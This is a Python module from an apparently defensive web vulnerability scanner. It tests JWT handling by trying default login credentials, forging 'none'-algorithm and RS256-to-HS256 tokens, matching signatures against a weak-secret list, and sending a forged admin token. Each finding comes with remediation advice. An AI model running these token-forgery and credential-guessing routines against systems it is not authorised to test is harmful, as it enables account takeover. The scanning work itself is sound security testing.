# scanner/access_control/jwt_vulnerabilities.py
"""
JWT (JSON Web Token) Vulnerabilities Scanner

Detects common JWT security issues:
- Algorithm confusion (None, HS256 vs RS256)
- Weak secrets
- Missing signature verification
- Expired token acceptance
- Information disclosure in payload

OWASP: A02:2021 - Cryptographic Failures
CWE-287: Improper Authentication
"""

import asyncio
import aiohttp
import base64
import json
import hmac
import hashlib
import re
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class JWTVulnerabilitiesScanner(BaseScanner):
    """Scanner for JWT-related vulnerabilities"""

    name="JWT Vulnerabilities Scanner",
    description="Detects JWT implementation vulnerabilities",
    owasp_category=OWASPCategory.A02_CRYPTOGRAPHIC_FAILURES
    
    def __init__(self):
        
        # Common weak secrets for brute force
        self.weak_secrets = [
            "secret", "password", "123456", "jwt_secret", "changeme",
            "key", "private", "admin", "test", "development",
            "your-256-bit-secret", "your-secret-key", "shhhhh",
            "supersecret", "jwt", "token", "auth", "secret123",
            "password123", "qwerty", "letmein", "welcome",
            "", "null", "undefined", "none",
        ]
        
        # JWT regex pattern
        self.jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        )
        
        # Common JWT header/cookie names
        self.jwt_locations = [
            "Authorization",
            "X-Access-Token",
            "X-Auth-Token",
            "X-JWT-Token",
            "token",
            "jwt",
            "access_token",
            "id_token",
            "auth_token",
        ]
    
    async def scan(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str] = None
    ) -> List[Vulnerability]:
        """
        Scan for JWT vulnerabilities.
        
        Args:
            session: aiohttp client session
            url: Target URL
            params: Request parameters (may contain JWTs)
            
        Returns:
            List of discovered JWT vulnerabilities
        """
        vulnerabilities = []
        
        # First, try to obtain a JWT from the application
        jwt_token = await self._find_jwt_token(session, url, params)
        
        if jwt_token:
            # Test various JWT vulnerabilities
            none_vuln = await self._test_none_algorithm(session, url, jwt_token)
            if none_vuln:
                vulnerabilities.append(none_vuln)
            
            alg_confusion = await self._test_algorithm_confusion(session, url, jwt_token)
            if alg_confusion:
                vulnerabilities.append(alg_confusion)
            
            weak_secret = await self._test_weak_secret(session, url, jwt_token)
            if weak_secret:
                vulnerabilities.append(weak_secret)
            
            expired_vuln = await self._test_expired_token(session, url, jwt_token)
            if expired_vuln:
                vulnerabilities.append(expired_vuln)
            
            # Check for sensitive data in payload
            sensitive_data = self._check_sensitive_payload(jwt_token, url)
            if sensitive_data:
                vulnerabilities.append(sensitive_data)
        
        # Test for missing JWT verification
        missing_verify = await self._test_missing_verification(session, url)
        if missing_verify:
            vulnerabilities.append(missing_verify)
        
        return vulnerabilities
    
    async def _find_jwt_token(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str] = None
    ) -> Optional[str]:
        """Find JWT token in response or parameters"""
        
        # Check if JWT is in params
        if params:
            for key, value in params.items():
                if self.jwt_pattern.match(str(value)):
                    return value
        
        # Try to get JWT from login endpoint
        login_endpoints = ["/login", "/auth", "/api/login", "/api/auth", "/api/v1/login"]
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        test_credentials = [
            {"username": "admin", "password": "admin"},
            {"email": "test@test.com", "password": "test"},
            {"user": "test", "pass": "test"},
        ]
        
        for endpoint in login_endpoints:
            login_url = urljoin(base_url, endpoint)
            
            for creds in test_credentials:
                try:
                    async with session.post(
                        login_url,
                        json=creds,
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False
                    ) as response:
                        # Check response body
                        try:
                            body = await response.json()
                            for key in ["token", "jwt", "access_token", "accessToken", "id_token"]:
                                if key in body:
                                    token = body[key]
                                    if self.jwt_pattern.match(str(token)):
                                        return token
                        except:
                            text = await response.text()
                            match = self.jwt_pattern.search(text)
                            if match:
                                return match.group()
                        
                        # Check response headers
                        for header in self.jwt_locations:
                            if header in response.headers:
                                value = response.headers[header]
                                if value.startswith("Bearer "):
                                    value = value[7:]
                                if self.jwt_pattern.match(value):
                                    return value
                
                except Exception:
                    continue
        
        return None
    
    def _decode_jwt(self, token: str) -> Tuple[Optional[dict], Optional[dict], str]:
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, ""
            
            # Decode header
            header_padding = 4 - len(parts[0]) % 4
            header_b64 = parts[0] + "=" * header_padding
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            
            # Decode payload
            payload_padding = 4 - len(parts[1]) % 4
            payload_b64 = parts[1] + "=" * payload_padding
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            return header, payload, parts[2]
        
        except Exception:
            return None, None, ""
    
    def _encode_jwt(self, header: dict, payload: dict, secret: str = "") -> str:
        """Encode JWT with optional signing"""
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        message = f"{header_b64}.{payload_b64}"
        
        alg = header.get("alg", "none")
        
        if alg == "none" or not secret:
            signature = ""
        elif alg == "HS256":
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()
        elif alg == "HS384":
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
            ).rstrip(b'=').decode()
        elif alg == "HS512":
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            ).rstrip(b'=').decode()
        else:
            signature = ""
        
        return f"{header_b64}.{payload_b64}.{signature}"
    
    async def _test_none_algorithm(
        self,
        session: aiohttp.ClientSession,
        url: str,
        original_token: str
    ) -> Optional[Vulnerability]:
        """Test for 'none' algorithm vulnerability"""
        header, payload, _ = self._decode_jwt(original_token)
        
        if not header or not payload:
            return None
        
        # Create tokens with none algorithm variations
        none_variants = ["none", "None", "NONE", "nOnE"]
        
        for alg in none_variants:
            modified_header = header.copy()
            modified_header["alg"] = alg
            
            # Create token with no signature
            none_token = self._encode_jwt(modified_header, payload)
            
            # Also try with empty signature
            for token_variant in [none_token, none_token.rstrip('.') + '.']:
                is_accepted = await self._test_token_acceptance(
                    session, url, token_variant
                )
                
                if is_accepted:
                    return Vulnerability(
                        vuln_type="JWT None Algorithm",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter="JWT Token",
                        payload=f"Algorithm: {alg}",
                        evidence=f"Server accepted JWT with '{alg}' algorithm",
                        description="JWT implementation accepts 'none' algorithm, allowing signature bypass",
                        cwe_id="CWE-327",
                        remediation="Explicitly verify algorithm in JWT validation. Never accept 'none' algorithm."
                    )
        
        return None
    
    async def _test_algorithm_confusion(
        self,
        session: aiohttp.ClientSession,
        url: str,
        original_token: str
    ) -> Optional[Vulnerability]:
        """Test for algorithm confusion (RS256 -> HS256)"""
        header, payload, _ = self._decode_jwt(original_token)
        
        if not header or not payload:
            return None
        
        original_alg = header.get("alg", "")
        
        # This attack works when RS256 is switched to HS256
        # and the public key is used as HMAC secret
        if original_alg.startswith("RS") or original_alg.startswith("ES"):
            # Try HS256 with common public key locations
            modified_header = header.copy()
            modified_header["alg"] = "HS256"
            
            # In a real attack, you'd need the public key
            # Here we test if the endpoint accepts HS256 at all when expecting RS256
            test_token = self._encode_jwt(modified_header, payload, "test")
            
            is_accepted = await self._test_token_acceptance(session, url, test_token)
            
            if is_accepted:
                return Vulnerability(
                    vuln_type="JWT Algorithm Confusion",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter="JWT Token",
                    payload=f"Changed {original_alg} to HS256",
                    evidence="Server accepted different algorithm than expected",
                    description="JWT implementation vulnerable to algorithm confusion attack",
                    cwe_id="CWE-327",
                    remediation="Explicitly specify and verify expected algorithm. Don't rely on 'alg' header."
                )
        
        return None
    
    async def _test_weak_secret(
        self,
        session: aiohttp.ClientSession,
        url: str,
        original_token: str
    ) -> Optional[Vulnerability]:
        """Test for weak JWT secrets"""
        header, payload, original_sig = self._decode_jwt(original_token)
        
        if not header or not payload:
            return None
        
        alg = header.get("alg", "")
        
        # Only test HMAC-based algorithms
        if not alg.startswith("HS"):
            return None
        
        # Try weak secrets
        for secret in self.weak_secrets:
            try:
                test_token = self._encode_jwt(header, payload, secret)
                _, _, test_sig = self._decode_jwt(test_token)
                
                if test_sig == original_sig:
                    return Vulnerability(
                        vuln_type="JWT Weak Secret",
                        severity=Severity.HIGH,
                        url=url,
                        parameter="JWT Token",
                        payload=f"Secret: {secret if secret else '(empty)'}",
                        evidence=f"JWT signed with weak/guessable secret",
                        description=f"JWT uses weak secret '{secret}' that can be easily guessed or brute-forced",
                        cwe_id="CWE-521",
                        remediation="Use a strong, randomly generated secret (256+ bits). Store securely."
                    )
            except Exception:
                continue
        
        return None
    
    async def _test_expired_token(
        self,
        session: aiohttp.ClientSession,
        url: str,
        token: str
    ) -> Optional[Vulnerability]:
        """Test if expired tokens are accepted"""
        header, payload, _ = self._decode_jwt(token)
        
        if not payload:
            return None
        
        import time
        current_time = int(time.time())
        
        # Check if token has expiration
        exp = payload.get("exp")
        
        if exp and exp < current_time:
            # Token is already expired, test if it's accepted
            is_accepted = await self._test_token_acceptance(session, url, token)
            
            if is_accepted:
                return Vulnerability(
                    vuln_type="JWT Expired Token Accepted",
                    severity=Severity.MEDIUM,
                    url=url,
                    parameter="JWT Token",
                    payload=f"Expired at: {exp}",
                    evidence="Server accepted expired JWT token",
                    description="JWT expiration (exp claim) is not being validated",
                    cwe_id="CWE-613",
                    remediation="Always validate 'exp' claim. Reject expired tokens."
                )
        
        return None
    
    def _check_sensitive_payload(self, token: str, url: str) -> Optional[Vulnerability]:
        """Check for sensitive data in JWT payload"""
        _, payload, _ = self._decode_jwt(token)
        
        if not payload:
            return None
        
        sensitive_keys = [
            "password", "passwd", "pwd", "secret", "api_key", "apikey",
            "credit_card", "ssn", "social_security", "private_key",
            "aws_secret", "database_password", "db_password"
        ]
        
        sensitive_found = []
        
        for key in payload.keys():
            key_lower = key.lower()
            if any(sensitive in key_lower for sensitive in sensitive_keys):
                sensitive_found.append(key)
        
        if sensitive_found:
            return Vulnerability(
                vuln_type="JWT Sensitive Data Exposure",
                severity=Severity.MEDIUM,
                url=url,
                parameter="JWT Payload",
                payload=f"Sensitive fields: {', '.join(sensitive_found)}",
                evidence=f"JWT contains potentially sensitive data in payload",
                description="JWT payload contains sensitive information that could be exposed",
                cwe_id="CWE-200",
                remediation="Don't store sensitive data in JWT payload. JWTs are only encoded, not encrypted."
            )
        
        return None
    
    async def _test_missing_verification(
        self,
        session: aiohttp.ClientSession,
        url: str
    ) -> Optional[Vulnerability]:
        """Test if endpoint accepts any JWT without verification"""
        # Create a completely fake JWT
        fake_header = {"alg": "HS256", "typ": "JWT"}
        fake_payload = {
            "sub": "admin",
            "role": "admin",
            "admin": True,
            "iat": 1234567890,
            "exp": 9999999999
        }
        
        fake_token = self._encode_jwt(fake_header, fake_payload, "fake_secret_12345")
        
        is_accepted = await self._test_token_acceptance(session, url, fake_token)
        
        if is_accepted:
            return Vulnerability(
                vuln_type="JWT Missing Signature Verification",
                severity=Severity.CRITICAL,
                url=url,
                parameter="JWT Token",
                payload="Fake JWT with arbitrary signature",
                evidence="Server accepted JWT without proper signature verification",
                description="JWT signature is not being verified, allowing token forgery",
                cwe_id="CWE-347",
                remediation="Always verify JWT signature before trusting the payload."
            )
        
        return None
    
    async def _test_token_acceptance(
        self,
        session: aiohttp.ClientSession,
        url: str,
        token: str
    ) -> bool:
        """Test if a token is accepted by the server"""
        headers_variants = [
            {"Authorization": f"Bearer {token}"},
            {"X-Access-Token": token},
            {"X-Auth-Token": token},
        ]
        
        for headers in headers_variants:
            try:
                async with session.get(
                    url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    # Consider it accepted if we get 200 or 2xx
                    if response.status in [200, 201, 202, 204]:
                        return True
                    # Also check if we don't get 401/403
                    if response.status not in [401, 403]:
                        # Check response for success indicators
                        try:
                            body = await response.json()
                            if "error" not in str(body).lower():
                                return True
                        except:
                            pass
            except Exception:
                continue
        
        return False